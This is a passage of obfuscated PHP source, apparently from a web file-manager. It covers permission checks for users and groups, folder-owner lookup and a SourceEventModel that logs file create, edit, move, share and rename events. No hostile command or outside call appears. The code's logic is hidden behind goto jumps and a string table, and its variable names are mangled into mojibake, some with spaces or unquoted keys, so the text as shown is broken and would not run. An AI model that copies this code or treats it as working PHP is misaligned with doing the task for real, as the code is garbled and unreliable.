D¹­›Ş­²Õ: } private function groupAuthInfo($b…¹æì…, $e¬»ò¼Ó¬) { $F¿Ã‹ğçé‰ =& $_SERVER[æ§›¦ÌáØ]; $DĞ…³ã“†Ê = Model($F¿Ã‹ğçé‰[503])->getInfo($e¬»ò¼Ó¬); return array($F¿Ã‹ğçé‰[1880] => intval($b…¹æì…[$F¿Ã‹ğçé‰[406]]), $F¿Ã‹ğçé‰[1864] => $b…¹æì…, $F¿Ã‹ğçé‰[1881] => LNG($F¿Ã‹ğçé‰[1882]), $F¿Ã‹ğçé‰[1873] => array($F¿Ã‹ğçé‰[413] => $DĞ…³ã“†Ê[$F¿Ã‹ğçé‰[28]], $F¿Ã‹ğçé‰[76] => KodIO::make($DĞ…³ã“†Ê[$F¿Ã‹ğçé‰[85]][$F¿Ã‹ğçé‰[395]]), $F¿Ã‹ğçé‰[1879] => $DĞ…³ã“†Ê[$F¿Ã‹ğçé‰[507]])); } protected function groupRootAuth($a ä ø·ï„, $FÒÓƒÊ°Ç = false) { goto FÛ¯µ¦¢Ê²; A¯°ƒéÌùÈ: $EçáÊäå‘…[$cŞ¨Ô„õº’] = $AÑ†ğÖö¥‡ ? $AÑ†ğÖö¥‡ : $aÈİñ•»‘; return $EçáÊäå‘…[$cŞ¨Ô„õº’]; goto dŒ´Àø†²Î; FÛ¯µ¦¢Ê²: $Bğ‚ŒäÅº =& $_SERVER[æ§›¦ÌáØ]; $FÒÓƒÊ°Ç = $FÒÓƒÊ°Ç ? $FÒÓƒÊ°Ç : USER_ID; $cŞ¨Ô„õº’ = $FÒÓƒÊ°Ç . $Bğ‚ŒäÅº[1883] . $a ä ø·ï„; goto B¸›’ùì”Ğ; fø®Ê¯½•: $FÜÕ ØµÒò = $this->userGroupList($FÒÓƒÊ°Ç); $aÈİñ•»‘ = isset($FÜÕ ØµÒò[$a ä ø·ï„]) ? $FÜÕ ØµÒò[$a ä ø·ï„][$Bğ‚ŒäÅº[406]] : !1; if ($aÈİñ•»‘ && Model($Bğ‚ŒäÅº[488])->authCheckAction($aÈİñ•»‘[$Bğ‚ŒäÅº[406]], $Bğ‚ŒäÅº[1709])) { $EçáÊäå‘…[$cŞ¨Ô„õº’] = $aÈİñ•»‘; return $aÈİñ•»‘; } goto F®®¸âæİ’; B¸›’ùì”Ğ: static $EçáÊäå‘… = array(); if (isset($EçáÊäå‘…[$cŞ¨Ô„õº’])) { return $EçáÊäå‘…[$cŞ¨Ô„õº’]; } $DÁŞ«¡š·± = Model($Bğ‚ŒäÅº[503])->getInfo($a ä ø·ï„); goto fø®Ê¯½•; F®®¸âæİ’: $B¾Éìğ’óâ = $this->sourceAuthSelect($DÁŞ«¡š·±[$Bğ‚ŒäÅº[85]][$Bğ‚ŒäÅº[395]]); $C·Ü¶ÀÃˆˆ = $B¾Éìğ’óâ ? $this->authMake($B¾Éìğ’óâ, $FÒÓƒÊ°Ç) : !1; $AÑ†ğÖö¥‡ = $C·Ü¶ÀÃˆˆ ? $C·Ü¶ÀÃˆˆ[$Bğ‚ŒäÅº[446]] : !1; goto A¯°ƒéÌùÈ; dŒ´Àø†²Î: } public function authOwnerApply($e·¹ÃŸÖ‡å) { goto F¬…×¸Õ†í; fŠàï—Íƒˆ: if (count($D¿¨½Éí¶) == 0) { $D¿¨½Éí¶ = $this->authFolderOwnerGroup($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[484]]); } $D¿¨½Éí¶ = array_unique($D¿¨½Éí¶); if (AuthModel::authCheckRoot($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[406]][$A­ºµ«‡‘[407]])) { $D¿¨½Éí¶[] = USER_ID; } goto cÌš¦ã¬´‡; CâĞÃÕ–·Š: $bÇå‚ÕÆ° = Model($A­ºµ«‡‘[1196])->parentLevelArray($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[502]]); $bÇå‚ÕÆ° = array_merge(array($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[395]]), array_reverse($bÇå‚ÕÆ°)); $Eµ©î¾Şí“ = $this->sourceAuthSelect($bÇå‚ÕÆ°); goto dß‡ÃÛÏçš; dß‡ÃÛÏçš: $a¯™Û„›Å¢ = array(); $D¿¨½Éí¶ = array(); foreach ($Eµ©î¾Şí“ as $f©æ²‹ùèó => $FÕ¬®°ÇÖ) { $eÌ°ŒùßÎ = $this->authFolderOwnerUser($FÕ¬®°ÇÖ); $a¯™Û„›Å¢[$f©æ²‹ùèó] = $eÌ°ŒùßÎ; $D¿¨½Éí¶ = array_merge($D¿¨½Éí¶, $eÌ°ŒùßÎ[$A­ºµ«‡‘[575]]); if ($eÌ°ŒùßÎ[$A­ºµ«‡‘[1885]]) { break; } } goto fŠàï—Íƒˆ; cÌš¦ã¬´‡: $e·¹ÃŸÖ‡å[$A­ºµ«‡‘[406]][$A­ºµ«‡‘[1886]] = Model($A­ºµ«‡‘[494])->userListInfo($D¿¨½Éí¶); return $e·¹ÃŸÖ‡å; goto CÂœ°ê¦; F¬…×¸Õ†í: $A­ºµ«‡‘ =& $_SERVER[æ§›¦ÌáØ]; if (empty($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[406]]) || isset($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[1884]]) && $e·¹ÃŸÖ‡å[$A­ºµ«‡‘[1884]]) { return $e·¹ÃŸÖ‡å; } if (AuthModel::authCheckRoot($e·¹ÃŸÖ‡å[$A­ºµ«‡‘[406]][$A­ºµ«‡‘[407]])) { return $e·¹ÃŸÖ‡å; } goto CâĞÃÕ–·Š; CÂœ°ê¦: } private function authFolderOwnerGroup($càÎ¥¿ƒ³À) { $fÃĞíò°šÛ =& $_SERVER[æ§›¦ÌáØ]; $döÇÔğ—æ® = Model($fÃĞíò°šÛ[1770])->where(array($fÃĞíò°šÛ[1689] => $càÎ¥¿ƒ³À))->select(); $fô‹¼ùòÚÌ = array(); if (!$döÇÔğ—æ®) { return $fô‹¼ùòÚÌ; } foreach ($döÇÔğ—æ® as $EİÇˆ¦×Íò) { $cŸäÈÛÄõ… = $this->authInfo($EİÇˆ¦×Íò); if (AuthModel::authCheckRoot($cŸäÈÛÄõ…[$fÃĞíò°šÛ[406]])) { $fô‹¼ùòÚÌ[] = $EİÇˆ¦×Íò[$fÃĞíò°šÛ[1520]]; } } return $fô‹¼ùòÚÌ; } private function authFolderOwnerUser($E­áéÚ½¡Á) { $e–İÏ—ƒÂ =& $_SERVER[æ§›¦ÌáØ]; $b³…áŠÂ“« = array(); $Eõ›ì = !1; foreach ($E­áéÚ½¡Á as $fŸ¾¸¿ê) { $DˆÕå®·‘Ğ = $this->authInfo($fŸ¾¸¿ê); if ($fŸ¾¸¿ê[$e–İÏ—ƒÂ[484]] == $e–İÏ—ƒÂ[191]) { $Eõ›ì = !0; } if ($fŸ¾¸¿ê[$e–İÏ—ƒÂ[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($DˆÕå®·‘Ğ[$e–İÏ—ƒÂ[406]])) { $b³…áŠÂ“«[] = $fŸ¾¸¿ê[$e–İÏ—ƒÂ[484]]; } } } return array($e–İÏ—ƒÂ[575] => $b³…áŠÂ“«, $e–İÏ—ƒÂ[1885] => $Eõ›ì); } public function authMake($côÎî¸…‰ğ, $CÑŞ˜åš²’ = false) { $e…»‰à°‘ =& $_SERVER[æ§›¦ÌáØ]; $c°é©©Òù = $this->authArrayCheck($côÎî¸…‰ğ, $CÑŞ˜åš²’); if ($c°é©©Òù[$e…»‰à°‘[1887]]) { $c°é©©Òù[$e…»‰à°‘[1887]] = $this->sourceAuthInfo($c°é©©Òù[$e…»‰à°‘[1887]]); } return $c°é©©Òù; } public function authArrayCheck($CòçÇ¾À‰£, $bî•§ÈŒ‚ = false) { goto fŞ¯Õôõé‚; aÍèÉÒÓØ…: $B÷çì¡ªÍ… = 0; $f®ŒœÌ¨Õ = 0; $c‰­¼¦îóì = 0; goto Eøá†¹´§; eÆÍˆÛ‹: $BòÔØ™½ = 0; $dµÓ¡£Ÿ¢ = 0; $cöÌŠ’²† = 0; goto aÍèÉÒÓØ…; dÜ’×¢º: foreach ($CòçÇ¾À‰£ as $E¾¯¢êƒÛÙ) { $dìœÏã°êÆ = $this->authInfo($E¾¯¢êƒÛÙ); if (!$dìœÏã°êÆ) { continue; } $C‚¶ÑÉÛÇÎ = $E¾¯¢êƒÛÙ[$C“œÁ¦•“¹[484]]; $dë…¦´‚Ñ = intval($dìœÏã°êÆ[$C“œÁ¦•“¹[406]]); if ($E¾¯¢êƒÛÙ[$C“œÁ¦•“¹[404]] == SourceModel::TYPE_USER && $C‚¶ÑÉÛÇÎ == $bî•§ÈŒ‚) { $BòÔØ™½ = !0; $cöÌŠ’²† = $dìœÏã°êÆ; $dµÓ¡£Ÿ¢ = $dë…¦´‚Ñ; } else { if ($E¾¯¢êƒÛÙ[$C“œÁ¦•“¹[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($C‚¶ÑÉÛÇÎ, $bî•§ÈŒ‚)) { $B÷çì¡ªÍ… = !0; $e½˜ÛõÃª³ = $this->groupStepToUserGroup($C‚¶ÑÉÛÇÎ, $bî•§ÈŒ‚); if ($e½˜ÛõÃª³ < $F¦¼½¨Ã‡Š) { $F¦¼½¨Ã‡Š = $e½˜ÛõÃª³; $f®ŒœÌ¨Õ = $dë…¦´‚Ñ; $c‰­¼¦îóì = $dìœÏã°êÆ; $c™‚ÂÑóéŠ = $C‚¶ÑÉÛÇÎ; } if ($e½˜ÛõÃª³ == $F¦¼½¨Ã‡Š && $dë…¦´‚Ñ >= $f®ŒœÌ¨Õ) { $f®ŒœÌ¨Õ = $dë…¦´‚Ñ; $c‰­¼¦îóì = $dìœÏã°êÆ; $c™‚ÂÑóéŠ = $C‚¶ÑÉÛÇÎ; } } else { if ($C‚¶ÑÉÛÇÎ == $C“œÁ¦•“¹[191]) { $dö¾ „‚„ = !0; $c’¹°ë¶ù = $dìœÏã°êÆ; $Cáì­å“½ = $dë…¦´‚Ñ; } } } } if ($BòÔØ™½) { $C¬ÙÅØÛù” = $dµÓ¡£Ÿ¢; $dìœÏã°êÆ = $cöÌŠ’²†; $fŒ„è°µÈë = LNG($C“œÁ¦•“¹[1888]); } else { if ($B÷çì¡ªÍ…) { $C¬ÙÅØÛù” = $f®ŒœÌ¨Õ; $dìœÏã°êÆ = $c‰­¼¦îóì; $D‰‡Ì²¬äè = Model($C“œÁ¦•“¹[503])->getInfo($c™‚ÂÑóéŠ); $fŒ„è°µÈë = $C“œÁ¦•“¹[160] . $D‰‡Ì²¬äè[$C“œÁ¦•“¹[507]] . $C“œÁ¦•“¹[1889] . LNG($C“œÁ¦•“¹[1890]); } else { if ($dö¾ „‚„) { $C¬ÙÅØÛù” = $Cáì­å“½; $dìœÏã°êÆ = $c’¹°ë¶ù; $fŒ„è°µÈë = LNG($C“œÁ¦•“¹[1861]); } else { $C¬ÙÅØÛù” = 0; $dìœÏã°êÆ = !1; $fŒ„è°µÈë = $C“œÁ¦•“¹[33]; } } } $fÃÛËéÅ—ä = array($C“œÁ¦•“¹[1880] => intval($C¬ÙÅØÛù”), $C“œÁ¦•“¹[1864] => $dìœÏã°êÆ, $C“œÁ¦•“¹[1881] => $fŒ„è°µÈë, $C“œÁ¦•“¹[1873] => $E¾¯¢êƒÛÙ[$C“œÁ¦•“¹[395]]); goto eîªÛºİÔ; eîªÛºİÔ: return $fÃÛËéÅ—ä; goto Dø½É½ˆ‹ô; Eøá†¹´§: $F¦¼½¨Ã‡Š = 1000; $c™‚ÂÑóéŠ = 0; $dö¾ „‚„ = 0; goto CÌğØ³æ‘Œ; fŞ¯Õôõé‚: $C“œÁ¦•“¹ =& $_SERVER[æ§›¦ÌáØ]; if (!$CòçÇ¾À‰£) { return array($C“œÁ¦•“¹[407] => 0, $C“œÁ¦•“¹[446] => !1); } $bî•§ÈŒ‚ = $bî•§ÈŒ‚ ? $bî•§ÈŒ‚ : USER_ID; goto eÆÍˆÛ‹; CÌğØ³æ‘Œ: $Cáì­å“½ = 0; $c’¹°ë¶ù = 0; $E¾¯¢êƒÛÙ = array($C“œÁ¦•“¹[395] => 0); goto dÜ’×¢º; Dø½É½ˆ‹ô: } private function groupContainUser($DÔèÚ†Šïó, $b¼íÇÃ¦ˆĞ = false) { return in_array($DÔèÚ†Šïó, $this->userGroupParents($b¼íÇÃ¦ˆĞ)); } private function groupStepToUserGroup($b¼­¹é”Ã—, $DÒÊŒ›³´¥ = false) { goto c­Ğ¼Ÿ¾­¹; A¹Ó•½ê¼: return $c’¦Š¡—Ã; goto A’Úô¾ÔÈ; c­Ğ¼Ÿ¾­¹: $fÙ¿¦ÕÔ¥ä =& $_SERVER[æ§›¦ÌáØ]; $f•˜†ÌõùĞ = $this->userGroupList($DÒÊŒ›³´¥); $c’¦Š¡—Ã = 1000; goto BæÃ»ÓäÏÏ; BæÃ»ÓäÏÏ: $B¼²Ü§ç‚İ = $GLOBALS[$fÙ¿¦ÕÔ¥ä[6]][$fÙ¿¦ÕÔ¥ä[88]][$fÙ¿¦ÕÔ¥ä[1781]] == 1; $FôŠ¯Ÿ½ìœ = $B¼²Ü§ç‚İ ? 3 : 2; foreach ($f•˜†ÌõùĞ as $e¡¬–·Ìâ) { if ($e¡¬–·Ìâ[$fÙ¿¦ÕÔ¥ä[1689]] == $b¼­¹é”Ã—) { return 0; } $CÓ¥ò’Ş÷‡ = explode($fÙ¿¦ÕÔ¥ä[47], trim($e¡¬–·Ìâ[$fÙ¿¦ÕÔ¥ä[502]], $fÙ¿¦ÕÔ¥ä[47])); if ($CÓ¥ò’Ş÷‡[0] == $fÙ¿¦ÕÔ¥ä[191] && count($CÓ¥ò’Ş÷‡) > $FôŠ¯Ÿ½ìœ) { $D¡Æ˜ô’ = array_reverse(array_slice($CÓ¥ò’Ş÷‡, $FôŠ¯Ÿ½ìœ)); $b’²œËßŠ = array_search($b¼­¹é”Ã—, $D¡Æ˜ô’); if ($b’²œËßŠ !== !1 && $b’²œËßŠ + 1 <= $c’¦Š¡—Ã) { $c’¦Š¡—Ã = $b’²œËßŠ + 1; } } } goto A¹Ó•½ê¼; A’Úô¾ÔÈ: } private function userGroupList($eåÜ±™š‰ñ = false) { $c…±Æ¹„–Ë =& $_SERVER[æ§›¦ÌáØ]; static $A‡Ç­ÒÅ¨ = array(); if (isset($A‡Ç­ÒÅ¨[$eåÜ±™š‰ñ])) { return $A‡Ç­ÒÅ¨[$eåÜ±™š‰ñ]; } $eÅæ­Í¯¬¸ = Model($c…±Æ¹„–Ë[519])->getInfo($eåÜ±™š‰ñ); $A‡Ç­ÒÅ¨[$eåÜ±™š‰ñ] = array_to_keyvalue($eÅæ­Í¯¬¸[$c…±Æ¹„–Ë[1862]], $c…±Æ¹„–Ë[1689]); return $A‡Ç­ÒÅ¨[$eåÜ±™š‰ñ]; } public function userGroupParents($c”×§Ä“ö¢) { goto fºÔ´µÄİ³; e‘›©ëİç”: $FÏåê±êˆ[$c”×§Ä“ö¢] = array_unique($a»¬¼ãå»ö); return $FÏåê±êˆ[$c”×§Ä“ö¢]; goto D”‹†°¯ÔÇ; B¿œ×†šË¦: $b¡ö›Ÿ‹‹‰ = $GLOBALS[$añİˆªÖ»Œ[6]][$añİˆªÖ»Œ[88]][$añİˆªÖ»Œ[1781]] == 1; $CëÕÍ³‘’¾ = $b¡ö›Ÿ‹‹‰ ? 3 : 2; foreach ($DÎĞñ¾­… as $B»³´Ò÷éì) { $AÃ¦„¥»‚ = array($B»³´Ò÷éì[$añİˆªÖ»Œ[1689]]); $fƒÃÏ¹ìÚà = explode($añİˆªÖ»Œ[47], trim($B»³´Ò÷éì[$añİˆªÖ»Œ[502]], $añİˆªÖ»Œ[47])); if ($fƒÃÏ¹ìÚà[0] == $añİˆªÖ»Œ[191] && count($fƒÃÏ¹ìÚà) > $CëÕÍ³‘’¾) { $Cê…°‹ôÙ— = array_slice($fƒÃÏ¹ìÚà, $CëÕÍ³‘’¾); $AÃ¦„¥»‚ = array_merge($AÃ¦„¥»‚, array_reverse($Cê…°‹ôÙ—)); } $a»¬¼ãå»ö = array_merge($a»¬¼ãå»ö, $AÃ¦„¥»‚); } goto e‘›©ëİç”; bÉ óã˜­§: if (isset($FÏåê±êˆ[$c”×§Ä“ö¢])) { return $FÏåê±êˆ[$c”×§Ä“ö¢]; } $DÎĞñ¾­… = $this->userGroupList($c”×§Ä“ö¢); $a»¬¼ãå»ö = array(); goto B¿œ×†šË¦; fºÔ´µÄİ³: $añİˆªÖ»Œ =& $_SERVER[æ§›¦ÌáØ]; static $FÏåê±êˆ = array(); $c”×§Ä“ö¢ = $c”×§Ä“ö¢ ? $c”×§Ä“ö¢ : USER_ID; goto bÉ óã˜­§; D”‹†°¯ÔÇ: } public function authTargetInfoMake($D“ˆØõ½¥ù) { goto aÊÎ¶º¦À; a¶¯ÈÅÛìÇ: foreach ($D“ˆØõ½¥ù as $BóÚéä‰­Ñ) { if ($BóÚéä‰­Ñ[$fë¤ëÛ®¤’[404]] == SourceModel::TYPE_USER) { $bİÌóçæ¡[] = intval($BóÚéä‰­Ñ[$fë¤ëÛ®¤’[484]]); } else { if ($BóÚéä‰­Ñ[$fë¤ëÛ®¤’[404]] == SourceModel::TYPE_GROUP) { $D„ö”ÛŠ‡¼[] = intval($BóÚéä‰­Ñ[$fë¤ëÛ®¤’[484]]); } } } if ($bİÌóçæ¡) { $bİÌóçæ¡ = Model($fë¤ëÛ®¤’[494])->userListInfo($bİÌóçæ¡); } if ($D„ö”ÛŠ‡¼) { $F†íˆÌ„ = array($fë¤ëÛ®¤’[1767] => array($fë¤ëÛ®¤’[411], $D„ö”ÛŠ‡¼)); $D„ö”ÛŠ‡¼ = Model($fë¤ëÛ®¤’[503])->field($fë¤ëÛ®¤’[1891])->where($F†íˆÌ„)->select(); $D„ö”ÛŠ‡¼ = array_to_keyvalue($D„ö”ÛŠ‡¼, $fë¤ëÛ®¤’[1689]); } goto cÌã¸î©Í“; cÌã¸î©Í“: return array($fë¤ëÛ®¤’[1892] => $bİÌóçæ¡, $fë¤ëÛ®¤’[1893] => $D„ö”ÛŠ‡¼); goto EÁ‡²·©ß±; aÊÎ¶º¦À: $fë¤ëÛ®¤’ =& $_SERVER[æ§›¦ÌáØ]; $bİÌóçæ¡ = array(); $D„ö”ÛŠ‡¼ = array(); goto a¶¯ÈÅÛìÇ; EÁ‡²·©ß±: } public function authInfo($EÀ¦²Í™Î) { $FĞ³‘›ï =& $_SERVER[æ§›¦ÌáØ]; if ($EÀ¦²Í™Î[$FĞ³‘›ï[1784]]) { $aÜù¤õÊƒ± = Model($FĞ³‘›ï[488])->listData($EÀ¦²Í™Î[$FĞ³‘›ï[1784]]); if (!$aÜù¤õÊƒ±) { return !1; $e—‘ÚÎÉƒ¹ = Model($FĞ³‘›ï[488])->listData(); $B™×ö‹”Øó = array_filter_by_field($e—‘ÚÎÉƒ¹, $FĞ³‘›ï[406], $FĞ³‘›ï[191]); return $B™×ö‹”Øó; } $A’’¯Äë¤ğ = array_field_key($aÜù¤õÊƒ±, array($FĞ³‘›ï[393], $FĞ³‘›ï[28], $FĞ³‘›ï[406], $FĞ³‘›ï[1711], $FĞ³‘›ï[1712])); $A’’¯Äë¤ğ[$FĞ³‘›ï[1894]] = $EÀ¦²Í™Î; return $A’’¯Äë¤ğ; } else { return array($FĞ³‘›ï[412] => 0, $FĞ³‘›ï[1695] => $EÀ¦²Í™Î[$FĞ³‘›ï[1838]], $FĞ³‘›ï[413] => $FĞ³‘›ï[33], $FĞ³‘›ï[1711] => $FĞ³‘›ï[1895]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\143\x65\x5f\x65\166\145\156\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\144\x65\163\143", '', "\151\156\163\145\x72\x74\54\165\x70\144\x61\164\145\x2c\163\x65\154\x65\143\164", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D“Ì·³ã“½, $CÉ¸ÃêÈƒ‰, $Có§Ãöäàá = '') { goto CÔƒø¢ì¼š; bÌ” ãƒ: return $this->add($DÌõ°­‡Á½); goto Bä²‚Œêá; bÄ¬ ¸È†: $DÌõ°­‡Á½ = array($d‰‡…ƒ¸[410] => $D“Ì·³ã“½, $d‰‡…ƒ¸[1896] => $eãİ•æÃÒé[$d‰‡…ƒ¸[478]], $d‰‡…ƒ¸[1897] => $eãİ•æÃÒé[$d‰‡…ƒ¸[28]], $d‰‡…ƒ¸[500] => !empty($eãİ•æÃÒé[$d‰‡…ƒ¸[500]]) ? $eãİ•æÃÒé[$d‰‡…ƒ¸[500]] : $d‰‡…ƒ¸[33], $d‰‡…ƒ¸[1511] => USER_ID, $d‰‡…ƒ¸[415] => $CÉ¸ÃêÈƒ‰, $d‰‡…ƒ¸[1513] => $Có§Ãöäàá); $this->addSystemLog($CÉ¸ÃêÈƒ‰, $DÌõ°­‡Á½); unset($DÌõ°­‡Á½[$d‰‡…ƒ¸[1897]], $DÌõ°­‡Á½[$d‰‡…ƒ¸[500]]); goto bÌ” ãƒ; CÔƒø¢ì¼š: $d‰‡…ƒ¸ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->eventSave) { return; } $eãİ•æÃÒé = Model($d‰‡…ƒ¸[1196])->sourceInfo($D“Ì·³ã“½); goto eğÕÔø¢ƒÌ; eğÕÔø¢ƒÌ: if (!$eãİ•æÃÒé) { return !1; } if ($this->isCacheEvent($eãİ•æÃÒé, $CÉ¸ÃêÈƒ‰)) { return; } if ($Có§Ãöäàá && is_string($Có§Ãöäàá)) { $Có§Ãöäàá = array($d‰‡…ƒ¸[1722] => $Có§Ãöäàá); } goto bÄ¬ ¸È†; Bä²‚Œêá: } private function addSystemLog($A¥¦ïÁÛ„, $EÎ† öÃ­†) { $a•éºäÓ‰º =& $_SERVER[æ§›¦ÌáØ]; if ($A¥¦ïÁÛ„ == $a•éºäÓ‰º[1898]) { $A¥¦ïÁÛ„ = $EÎ† öÃ­†[$a•éºäÓ‰º[431]][$a•éºäÓ‰º[1899]]; } else { if (in_array($A¥¦ïÁÛ„, array($a•éºäÓ‰º[1666], $a•éºäÓ‰º[1900]))) { $A¥¦ïÁÛ„ = $EÎ† öÃ­†[$a•éºäÓ‰º[431]][$a•éºäÓ‰º[708]]; } } $aŒÏ¦øèäò = array_merge($EÎ† öÃ­†, array($a•éºäÓ‰º[1901] => $EÎ† öÃ­†[$a•éºäÓ‰º[395]], $a•éºäÓ‰º[1902] => $EÎ† öÃ­†[$a•éºäÓ‰º[1902]])); Model($a•éºäÓ‰º[1630])->addLog($a•éºäÓ‰º[1903] . $A¥¦ïÁÛ„, $aŒÏ¦øèäò); } private function isCacheEvent($e°©Ó‰ƒÏí, $bˆ¿¬Š«‚) { if ($e°©Ó‰ƒÏí[$_SERVER[æ§›¦ÌáØ][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($añç¾´æÄ, $F™–¤›˜‘) { $E˜åå½±Ùø =& $_SERVER[æ§›¦ÌáØ]; $AÇÎË¬Óİœ = Model($E˜åå½±Ùø[1196])->sourceInfo($añç¾´æÄ); $cõà˜šÉÉ = array($E˜åå½±Ùø[1899] => $F™–¤›˜‘, $E˜åå½±Ùø[28] => $AÇÎË¬Óİœ[$E˜åå½±Ùø[28]]); return $this->addEvent($añç¾´æÄ, $E˜åå½±Ùø[1898], $cõà˜šÉÉ); } public function eventFileEdit($bô„¨’Ä§œ) { $F¢Ü…‹¨Ñ¿ =& $_SERVER[æ§›¦ÌáØ]; $c¡ƒ®Ç—Ä = array($F¢Ü…‹¨Ñ¿[1904] => $_SERVER[$F¢Ü…‹¨Ñ¿[1905]], $F¢Ü…‹¨Ñ¿[1906] => strtolower(ACTION)); return $this->addEvent($bô„¨’Ä§œ, $F¢Ü…‹¨Ñ¿[1656], $c¡ƒ®Ç—Ä); } public function eventRecycle($A«½Şé†•, $EÚ‘ÂÀÚ¸Ø) { return $this->addEvent($A«½Şé†•, $_SERVER[æ§›¦ÌáØ][1900], $EÚ‘ÂÀÚ¸Ø); } public function eventRemove($F¿î—¿´ôƒ) { $FÄÊÉîÅÌ =& $_SERVER[æ§›¦ÌáØ]; $CÁè·…¯çß = Model($FÄÊÉîÅÌ[1196])->sourceInfo($F¿î—¿´ôƒ); $e­ä„£“„ = $CÁè·…¯çß[$FÄÊÉîÅÌ[28]]; return $this->addEvent($CÁè·…¯çß[$FÄÊÉîÅÌ[478]], $FÄÊÉîÅÌ[1655], $e­ä„£“„); } public function eventShare($B…ó•¨Ó×¡, $aî‘¦ïÀç™) { return $this->addEvent($B…ó•¨Ó×¡, $_SERVER[æ§›¦ÌáØ][1666], $aî‘¦ïÀç™); } public function eventMove($a´åé÷Ñ¨, $c¦‚‰ˆŸÍê, $B¦æ¸øãºç) { goto cç¸Á¼ÍÛ„; aŞ©êÊß¾½: $this->addEvent($c¦‚‰ˆŸÍê, $FÑ›Œ±Šâ­[1910], $cÍêÇ®Â¨Ó); goto A™Ÿ±í‹˜˜; dºï«‚…™±: $this->addEvent($a´åé÷Ñ¨, $FÑ›Œ±Šâ­[533], $cÍêÇ®Â¨Ó); $D ø»“òÆî = $CçòÆĞóß¹->sourceInfo($a´åé÷Ñ¨); $cÍêÇ®Â¨Ó = array($FÑ›Œ±Šâ­[395] => $D ø»“òÆî[$FÑ›Œ±Šâ­[395]], $FÑ›Œ±Šâ­[28] => $D ø»“òÆî[$FÑ›Œ±Šâ­[28]]); goto aŞ©êÊß¾½; cµ£’Ş˜æ¯: $céËëµËÌæ = $CçòÆĞóß¹->sourceInfo($c¦‚‰ˆŸÍê); $CÅÁ‘İƒ…ƒ = $CçòÆĞóß¹->sourceInfo($B¦æ¸øãºç); $cÍêÇ®Â¨Ó = array($FÑ›Œ±Šâ­[1045] => $c¦‚‰ˆŸÍê, $FÑ›Œ±Šâ­[1907] => $céËëµËÌæ[$FÑ›Œ±Šâ­[28]], $FÑ›Œ±Šâ­[1887] => !empty($céËëµËÌæ[$FÑ›Œ±Šâ­[500]]) ? $céËëµËÌæ[$FÑ›Œ±Šâ­[500]] : $FÑ›Œ±Šâ­[33], $FÑ›Œ±Šâ­[1046] => $B¦æ¸øãºç, $FÑ›Œ±Šâ­[1908] => $CÅÁ‘İƒ…ƒ[$FÑ›Œ±Šâ­[28]], $FÑ›Œ±Šâ­[1909] => !empty($CÅÁ‘İƒ…ƒ[$FÑ›Œ±Šâ­[500]]) ? $CÅÁ‘İƒ…ƒ[$FÑ›Œ±Šâ­[500]] : $FÑ›Œ±Šâ­[33]); goto dºï«‚…™±; cç¸Á¼ÍÛ„: $FÑ›Œ±Šâ­ =& $_SERVER[æ§›¦ÌáØ]; $CçòÆĞóß¹ = Model($FÑ›Œ±Šâ­[1196]); $D ø»“òÆî = $CçòÆĞóß¹->sourceInfo($a´åé÷Ñ¨); goto cµ£’Ş˜æ¯; A™Ÿ±í‹˜˜: } public function eventCopy($eÃ©Áò— ó) { $this->eventCreate($eÃ©Áò— ó, $_SERVER[æ§›¦ÌáØ][531]); } public function eventRename($FÜÈÂ¢Ú¬š, $Aã‹¬Õ™¤É, $D˜õªÎôĞ) { $F×¢‹¹›ö’ =& $_SERVER[æ§›¦ÌáØ]; $Bİò…éê = array($F×¢‹¹›ö’[1045] => $Aã‹¬Õ™¤É, $F×¢‹¹›ö’[1046] => $D˜õªÎôĞ); return $this->addEvent($FÜÈÂ¢Ú¬š, $F×¢‹¹›ö’[1210], $Bİò…éê); } public function eventAddComment($FªºÂø‡¼, $FñÆ®é¿‡) { return $this->addEvent($FªºÂø‡¼, $_SERVER[æ§›¦ÌáØ][1911], $FñÆ®é¿‡); } public function eventAddDesc($Cöğ‚…ŠŒ, $dç©Ê¯îÈ‰) { return $this->addEvent($Cöğ‚…ŠŒ, $_SERVER[æ§›¦ÌáØ][1912], $dç©Ê¯îÈ‰); } public function listBySource($fŸÌ»Á ëó) { goto CÉÊÈÕ¡ä; FÈ½¯‰‚‡‚: if ($bÙÊˆš†¡[$FÎ ñˆ§š¾[403]] == $FÎ ñˆ§š¾[87]) { $eÛÇè‡Û¨â = Model($FÎ ñˆ§š¾[1196])->listSearchChildren($fŸÌ»Á ëó, 20000); $eÛÇè‡Û¨â[] = $fŸÌ»Á ëó . $FÎ ñˆ§š¾[375]; $d‹¶¸ë„ˆĞ = array($FÎ ñˆ§š¾[395] => array($FÎ ñˆ§š¾[7], $eÛÇè‡Û¨â)); } $dÈÙ¨²²¤ = $this->where($d‹¶¸ë„ˆĞ)->order($FÎ ñˆ§š¾[1913])->selectPage(); if ($dÈÙ¨²²¤[$FÎ ñˆ§š¾[364]][$FÎ ñˆ§š¾[365]] == 0) { $dÈÙ¨²²¤[$FÎ ñˆ§š¾[364]][$FÎ ñˆ§š¾[365]] = 1; $dÈÙ¨²²¤[$FÎ ñˆ§š¾[367]] = array(array($FÎ ñˆ§š¾[410] => $fŸÌ»Á ëó, $FÎ ñˆ§š¾[1896] => $bÙÊˆš†¡[$FÎ ñˆ§š¾[478]], $FÎ ñˆ§š¾[1511] => $bÙÊˆš†¡[$FÎ ñˆ§š¾[432]], $FÎ ñˆ§š¾[415] => $FÎ ñˆ§š¾[1914], $FÎ ñˆ§š¾[416] => $bÙÊˆš†¡[$FÎ ñˆ§š¾[194]], $FÎ ñˆ§š¾[1513] => $FÎ ñˆ§š¾[33])); } goto aÂ¾Şáå×ö; aÂ¾Şáå×ö: return 